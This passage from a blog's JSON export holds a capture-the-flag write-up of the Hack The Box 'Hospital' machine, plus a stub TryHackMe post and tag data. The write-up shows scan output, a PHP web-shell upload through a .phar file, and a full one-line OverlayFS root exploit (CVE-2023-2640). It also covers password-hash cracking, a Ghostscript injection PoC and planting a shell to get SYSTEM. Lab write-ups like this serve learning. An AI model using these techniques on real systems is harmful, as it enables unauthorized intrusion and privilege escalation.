id=\"ROOT-Foothold\"><a href=\"#ROOT-Foothold\" class=\"headerlink\" title=\"ROOT Foothold\"></a>ROOT Foothold</h2><p><img src=\"https://imgur.com/3G18Iz7.png\"></p>\n<p>Going back to the windows shell instance and enumerating further on the root directory there’s a <code>xampp</code> directory which has <code>htdocs</code> where all the programs for the web pages will be stored.</p>\n<p><img src=\"https://imgur.com/30Z8nOy.png\"></p>\n<p>Notably, we can see there’s a <code>shell.php</code> laying around. I replace the Content with that PHP Powny Shell.<br>You will get a Shell as Administrator and finally the Root Flag.</p>\n<p><img src=\"https://imgur.com/TXTDJdT.png\"></p>\n<p>Checking out pownyshell we get <code>system</code> access. </p>\n<p><img src=\"https://imgur.com/u0zg5rf.png\"></p>\n","cover":false,"excerpt":"","more":"<p><img src=\"https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png\"></p>\n<h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro\"></a>Intro</h2><p>Hospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc</p>\n<h2 id=\"Initial-Recon\"><a href=\"#Initial-Recon\" class=\"headerlink\" title=\"Initial Recon\"></a>Initial Recon</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT     STATE SERVICE          REASON</span><br><span class=\"line\">22/tcp   open  ssh              syn-ack ttl 62</span><br><span class=\"line\">53/tcp   open  domain           syn-ack ttl 127</span><br><span class=\"line\">88/tcp   open  kerberos-sec     syn-ack ttl 127</span><br><span class=\"line\">135/tcp  open  msrpc            syn-ack ttl 127</span><br><span class=\"line\">139/tcp  open  netbios-ssn      syn-ack ttl 127</span><br><span class=\"line\">389/tcp  open  ldap             syn-ack ttl 127</span><br><span class=\"line\">443/tcp  open  https            syn-ack ttl 127</span><br><span class=\"line\">445/tcp  open  microsoft-ds     syn-ack ttl 127</span><br><span class=\"line\">464/tcp  open  kpasswd5         syn-ack ttl 127</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap   syn-ack ttl 127</span><br><span class=\"line\">636/tcp  open  ldapssl          syn-ack ttl 127</span><br><span class=\"line\">1801/tcp open  msmq             syn-ack ttl 127</span><br><span class=\"line\">2103/tcp open  zephyr-clt       syn-ack ttl 127</span><br><span class=\"line\">2105/tcp open  eklogin          syn-ack ttl 127</span><br><span class=\"line\">2107/tcp open  msmq-mgmt        syn-ack ttl 127</span><br><span class=\"line\">3268/tcp open  globalcatLDAP    syn-ack ttl 127</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl syn-ack ttl 127</span><br><span class=\"line\">3389/tcp open  ms-wbt-server    syn-ack ttl 127</span><br><span class=\"line\">5985/tcp open  wsman            syn-ack ttl 127</span><br><span class=\"line\">6065/tcp open  winpharaoh       syn-ack ttl 127</span><br><span class=\"line\">6403/tcp open  boe-cachesvr     syn-ack ttl 127</span><br><span class=\"line\">6406/tcp open  boe-processsvr   syn-ack ttl 127</span><br><span class=\"line\">6407/tcp open  boe-resssvr1     syn-ack ttl 127</span><br><span class=\"line\">6409/tcp open  boe-resssvr3     syn-ack ttl 127</span><br><span class=\"line\">6617/tcp open  unknown          syn-ack ttl 127</span><br><span class=\"line\">6635/tcp open  mpls-udp         syn-ack ttl 127</span><br><span class=\"line\">8080/tcp open  http-proxy       syn-ack ttl 62</span><br><span class=\"line\">9389/tcp open  adws             syn-ack ttl 127</span><br><span class=\"line\"></span><br><span class=\"line\">Read data files from: /usr/bin/../share/nmap</span><br><span class=\"line\"><span class=\"comment\"># Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds</span></span><br><span class=\"line\">                                                                                                                    </span><br><span class=\"line\">❯ <span class=\"built_in\">cat</span> Script_TCP_10.10.11.241.nmap</span><br><span class=\"line\"><span class=\"comment\"># Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241</span></span><br><span class=\"line\">Nmap scan report <span class=\"keyword\">for</span> 10.10.11.241</span><br><span class=\"line\">Host is up (0.48s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE           VERSION</span><br><span class=\"line\">22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)</span><br><span class=\"line\">|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)</span><br><span class=\"line\">53/tcp   open  domain            Simple DNS Plus</span><br><span class=\"line\">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-26 01:02:02Z)</span><br><span class=\"line\">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: 2023-09-06T10:49:03</span><br><span class=\"line\">|_Not valid after:  2028-09-06T10:49:03</span><br><span class=\"line\">443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span>)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">|_http-title: Hospital Webmail :: Welcome to Hospital Webmail</span><br><span class=\"line\">| ssl-cert: Subject: commonName=localhost</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2009</span>-<span class=\"number\">11</span>-<span class=\"number\">10</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2019</span>-<span class=\"number\">11</span>-<span class=\"number\">08</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">|_http-server-header: Apache/<span class=\"number\">2.4</span>.<span class=\"number\">56</span> (Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span></span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/<span class=\"number\">1.1</span></span><br><span class=\"line\"><span class=\"number\">445</span>/tcp  open  microsoft-ds?</span><br><span class=\"line\"><span class=\"number\">464</span>/tcp  open  kpasswd5?</span><br><span class=\"line\"><span class=\"number\">593</span>/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP <span class=\"number\">1.0</span></span><br><span class=\"line\"><span class=\"number\">636</span>/tcp  open  ldapssl?</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2023</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2028</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\"><span class=\"number\">1801</span>/tcp open  msmq?</span><br><span class=\"line\"><span class=\"number\">2103</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">2105</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">2107</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">3268</span>/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2023</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2028</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\"><span class=\"number\">3269</span>/tcp open  globalcatLDAPssl?</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2023</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2028</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\"><span class=\"number\">3389</span>/tcp open  ms-wbt-server     Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2024</span>-<span class=\"number\">02</span>-<span class=\"number\">24</span>T17:<span class=\"number\">09</span>:<span class=\"number\">39</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2024</span>-<span class=\"number\">08</span>-<span class=\"number\">25</span>T17:<span class=\"number\">09</span>:<span class=\"number\">39</span></span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: HOSPITAL</span><br><span class=\"line\">|   NetBIOS_Domain_Name: HOSPITAL</span><br><span class=\"line\">|   NetBIOS_Computer_Name: DC</span><br><span class=\"line\">|   DNS_Domain_Name: hospital.htb</span><br><span class=\"line\">|   DNS_Computer_Name: DC.hospital.htb</span><br><span class=\"line\">|   DNS_Tree_Name: hospital.htb</span><br><span class=\"line\">|   Product_Version: <span class=\"number\">10.0</span>.<span class=\"number\">17763</span></span><br><span class=\"line\">|_  System_Time: <span class=\"number\">2024</span>-<span class=\"number\">02</span>-<span class=\"number\">26</span>T01:<span class=\"number\">03</span>:<span class=\"number\">21</span>+<span class=\"number\">00</span>:<span class=\"number\">00</span></span><br><span class=\"line\"><span class=\"number\">5985</span>/tcp open  http              Microsoft HTTPAPI httpd <span class=\"number\">2.0</span> (SSDP/UPnP)</span><br><span class=\"line\">|_http-title: Not Found</span><br><span class=\"line\">|_http-server-header: Microsoft-HTTPAPI/<span class=\"number\">2.0</span></span><br><span class=\"line\"><span class=\"number\">6065</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6403</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6406</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6407</span>/tcp open  ncacn_http        Microsoft Windows RPC over HTTP <span class=\"number\">1.0</span></span><br><span class=\"line\"><span class=\"number\">6409</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6617</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6635</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">8080</span>/tcp open  http              Apache httpd <span class=\"number\">2.4</span>.<span class=\"number\">55</span> ((Ubuntu))</span><br><span class=\"line\">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class=\"line\">| http-cookie-flags: </span><br><span class=\"line\">|   /: </span><br><span class=\"line\">|     PHPSESSID: </span><br><span class=\"line\">|_      httponly flag not <span class=\"built_in\">set</span></span><br><span class=\"line\">| http-title: Login</span><br><span class=\"line\">|_Requested resource was login.php</span><br><span class=\"line\">|_http-server-header: Apache/2.4.55 (Ubuntu)</span><br><span class=\"line\">9389/tcp open  mc-nmf            .NET Message Framing</span><br><span class=\"line\">Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   <span class=\"built_in\">date</span>: 2024-02-26T01:03:19</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   3:1:1: </span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\"></span><br><span class=\"line\">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Following our nmap scans, first off we check out the websites on ports <code>8080</code> and <code>443</code>.</p>\n<h2 id=\"Web-Enumeration\"><a href=\"#Web-Enumeration\" class=\"headerlink\" title=\"Web Enumeration\"></a>Web Enumeration</h2><p>Loading out the websites on the respective ports, on port <code>443</code> we are met with a login site same case applies to port <code>8080</code></p>\n<p><img src=\"https://imgur.com/mG8iUuG.png\" alt=\"port 443\"></p>\n<p><img src=\"https://imgur.com/tG024km.png\" alt=\"port 8080\"></p>\n<h3 id=\"Fuzzing\"><a href=\"#Fuzzing\" class=\"headerlink\" title=\"Fuzzing\"></a>Fuzzing</h3><p>The next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">.hta.php                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms]</span><br><span class=\"line\">.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms]</span><br><span class=\"line\">.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms]</span><br><span class=\"line\">.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms]</span><br><span class=\"line\">config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms]</span><br><span class=\"line\">css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms]</span><br><span class=\"line\">failed.php              [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms]</span><br><span class=\"line\">fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms]</span><br><span class=\"line\">images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]</span><br><span class=\"line\">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]</span><br><span class=\"line\">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]</span><br><span class=\"line\">js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms]</span><br><span class=\"line\">login.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms]</span><br><span class=\"line\">logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]</span><br><span class=\"line\">register.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms]</span><br><span class=\"line\">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms]</span><br><span class=\"line\">success.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms]</span><br><span class=\"line\">upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms]</span><br><span class=\"line\">uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms]</span><br><span class=\"line\">vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]</span><br></pre></td></tr></table></figure>\n\n<p>First thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere.<br><img src=\"https://imgur.com/sZNmuyx.png\"></p>\n<p>After logging in we are redirected to a page where we can upload files on the webpage.<br><img src=\"https://imgur.com/ySaSfRw.png\"></p>\n<p>Look at this instantly we need to try out some file upload attacks and since we have the <a href=\"https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------\">resources</a> to do so. We see that we can that we can upload a <code>.phar</code> file instead of a php file which subsequently involves getting a shell through accessing the uploads file. </p>\n<p>From my research i opted to go with <a href=\"https://github.com/flozz/p0wny-shell\">powny</a> a very basic, single-file, PHP shell. After changing the extension to <code>phar</code> extension, we get a successful upload response.<br>From our fuzzing earlier we saw an <code>/uploads</code> which can basically access files that we’ve uploaded, which triggers a shell on the box.</p>\n<p><img src=\"https://imgur.com/Zc1hBoJ.png\"></p>\n<h2 id=\"Initial-Access\"><a href=\"#Initial-Access\" class=\"headerlink\" title=\"Initial Access.\"></a>Initial Access.</h2><p>Having landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using <a href=\"https://github.com/calebstewart/pwncat\">pwncat</a>. Where we get an active session.<br><img src=\"https://imgur.com/1CxIELr.png\"></p>\n<h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration.\"></a>Enumeration.</h3><p>Running some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number.<br><img src=\"https://imgur.com/ETUmbkq.png\"></p>\n<p><img src=\"https://imgur.com/JRWLY6J.png\"></p>\n<p>A username called <code>drwilliams</code> trying to access his folder we are given permission denied as we are <code>www-data</code> and can’t access content inside his folder due to insufficient permissions.</p>\n<p><img src=\"https://imgur.com/kipG9XY.png\"></p>\n<h2 id=\"Privesc\"><a href=\"#Privesc\" class=\"headerlink\" title=\"Privesc\"></a>Privesc</h2><p>Checking for vulnerabilities pertaining the system version we land on <code>CVE-2023–2640</code> a vulnerability that affects the Ubuntu kernel’s OverlayFS module.</p>\n<p>First off we need to identify if our system is running overlay.</p>\n<p><img src=\"https://imgur.com/v18baZ9.png\"> </p>\n<p>and we see its running overlay to exploit this there’s a public <a href=\"https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\">POC</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">unshare -<span class=\"built_in\">rm</span> sh -c <span class=\"string\">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; python3 -c &#x27;import os;os.setuid(0);os.system(\\&quot;/bin/bash\\&quot;)&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>which when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.</p>\n<p>Running the <code>POC</code> we get some root access.<br><img src=\"https://imgur.com/QnESbaR.png\"></p>\n<p>Now having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get <code>drwilliams</code>‘s hash.Cracking the hash we get the password.</p>\n<p><img src=\"https://imgur.com/Aa2jFb3l.png\"></p>\n<p>which when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to <code>drwilliams</code> concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices <a href=\"https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection\">poc</a></p>\n<p><img src=\"https://imgur.com/FLksOng.png\"></p>\n<p>After reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out <a href=\"https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript\">vsosciety_</a></p>\n<p><img src=\"https://imgur.com/zJ8a8Gg.png\"></p>\n<h2 id=\"Windows-Foothold\"><a href=\"#Windows-Foothold\" class=\"headerlink\" title=\"Windows Foothold.\"></a>Windows Foothold.</h2><p>After sending the payload, we receive a connection back.</p>\n<p><img src=\"https://imgur.com/kra6hpU.png\"></p>\n<p><img src=\"https://imgur.com/oNcq1q2.png\"></p>\n<p>Navigating to the <code>/Desktop</code> directory we get the user flag.</p>\n<p><img src=\"https://imgur.com/oNcq1q2.png\"></p>\n<p>Further checking the <code>bat</code> file on the Documents directory we identify that there is an embedded password on the bat file.</p>\n<p><img src=\"https://imgur.com/dKv1o8q.png\"></p>\n<h2 id=\"Enumerating-RPCCLIENT\"><a href=\"#Enumerating-RPCCLIENT\" class=\"headerlink\" title=\"Enumerating RPCCLIENT\"></a>Enumerating RPCCLIENT</h2><p>Having the credentials and the information from our scans, <code>RPC</code> is open, trying out the creds we got on the bat file, we get access.</p>\n<h2 id=\"ROOT-Foothold\"><a href=\"#ROOT-Foothold\" class=\"headerlink\" title=\"ROOT Foothold\"></a>ROOT Foothold</h2><p><img src=\"https://imgur.com/3G18Iz7.png\"></p>\n<p>Going back to the windows shell instance and enumerating further on the root directory there’s a <code>xampp</code> directory which has <code>htdocs</code> where all the programs for the web pages will be stored.</p>\n<p><img src=\"https://imgur.com/30Z8nOy.png\"></p>\n<p>Notably, we can see there’s a <code>shell.php</code> laying around. I replace the Content with that PHP Powny Shell.<br>You will get a Shell as Administrator and finally the Root Flag.</p>\n<p><img src=\"https://imgur.com/TXTDJdT.png\"></p>\n<p>Checking out pownyshell we get <code>system</code> access. </p>\n<p><img src=\"https://imgur.com/u0zg5rf.png\"></p>\n"},{"title":"Simple CTF","date":"2024-01-20T08:30:03.000Z","draft":false,"description":"Simple CTF TryhackMe","top_img":"/images/cyberpunk-red.jpg","_content":"\nHi guys, welcome back to another Tryhackme room starting off the year with.\n\n","source":"_posts/tryhackme/simple-ctf/easyCTF.md","raw":"---\ntitle: \"Simple CTF\"\ndate: 2024-01-20T11:30:03+00:00\ndraft: false\ntags: [\"tryhackme\", \"web\"]\ndescription: \"Simple CTF TryhackMe\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\nHi guys, welcome back to another Tryhackme room starting off the year with.\n\n","slug":"tryhackme/simple-ctf/easyCTF","published":1,"updated":"2024-07-16T20:39:45.121Z","_id":"clyouz1kj0010wgjn2rkz7s7t","comments":1,"layout":"post","photos":[],"content":"<p>Hi guys, welcome back to another Tryhackme room starting off the year with.</p>\n","cover":false,"excerpt":"","more":"<p>Hi guys, welcome back to another Tryhackme room starting off the year with.</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"clyouz1ia0001wgjn3zdbe0sk","tag_id":"clyouz1ip0004wgjn9lvk471a","_id":"clyouz1j10009wgjn5nyg14jk"},{"post_id":"clyouz1im0003wgjn5szqapgh","tag_id":"clyouz1j00008wgjnclbja0ns","_id":"clyouz1jh000hwgjn8dgra4gr"},{"post_id":"clyouz1im0003wgjn5szqapgh","tag_id":"clyouz1j7000cwgjn10fc0f9h","_id":"clyouz1ji000iwgjn7u0f6dz6"},{"post_id":"clyouz1ir0005wgjn0asmeg2l","tag_id":"clyouz1j00008wgjnclbja0ns","_id":"clyouz1jj000kwgjndpfe97hn"},{"post_id":"clyouz1iu0006wgjn70bd7b4r","tag_id":"clyouz1j00008wgjnclbja0ns","_id":"clyouz1jk000mwgjn7jfyfuds"},{"post_id":"clyouz1iy0007wgjne6cb5apx","tag_id":"clyouz1jj000lwgjn1xyp2u64","_id":"clyouz1jk000owgjngm8k83nj"},{"post_id":"clyouz1j2000awgjna3vd65l2","tag_id":"clyouz1jk000nwgjnaaf6bdaz","_id":"clyouz1jl000qwgjn469jeipn"},{"post_id":"clyouz1j4000bwgjn7h8q1e1x","tag_id":"clyouz1jk000pwgjn74j8g2fo","_id":"clyouz1jl000swgjng9bf43to"},{"post_id":"clyouz1j7000dwgjn5l6b4ju3","tag_id":"clyouz1jk000pwgjn74j8g2fo","_id":"clyouz1jm000uwgjn2rz01rsb"},{"post_id":"clyouz1j8000ewgjnbrp30ory","tag_id":"clyouz1jm000twgjnb5on05dr","_id":"clyouz1jn000wwgjn74hs3l0n"},{"post_id":"clyouz1jf000gwgjn2mc2dusy","tag_id":"clyouz1jk000nwgjnaaf6bdaz","_id":"clyouz1jn000ywgjn9kzrbhsn"},{"post_id":"clyouz1jf000gwgjn2mc2dusy","tag_id":"clyouz1jn000xwgjn3qui2898","_id":"clyouz1jo000zwgjn547e7qyr"},{"post_id":"clyouz1kj0010wgjn2rkz7s7t","tag_id":"clyouz1jm000twgjnb5on05dr","_id":"clyouz1kr0012wgjn8xwn3rkf"},{"post_id":"clyouz1kj0010wgjn2rkz7s7t","tag_id":"clyouz1kq0011wgjnbavrcxxi","_id":"clyouz1kr0013wgjn5to52223"}],"Tag":[{"name":"rdp","_id":"clyouz1ip0004wgjn9lvk471a"},{"name":"Active-Directory","_id":"clyouz1j00008wgjnclbja0ns"},{"name":"access control list","_id":"clyouz1j7000cwgjn10fc0f9h"},{"name":"ctf","_id":"clyouz1jj000lwgjn1xyp2u64"},{"name":"htb","_id":"clyouz1jk000nwgjnaaf6bdaz"},{"name":"Metasploit-ctf","_id":"clyouz1jk000pwgjn74j8g2fo"},{"name":"tryhackme","_id":"clyouz1jm000twgjnb5on05dr"},{"name":"Windows","_id":"clyouz1jn000xwgjn3qui2898"},{"name":"web","_id":"clyouz1kq0011wgjnbavrcxxi"}]}}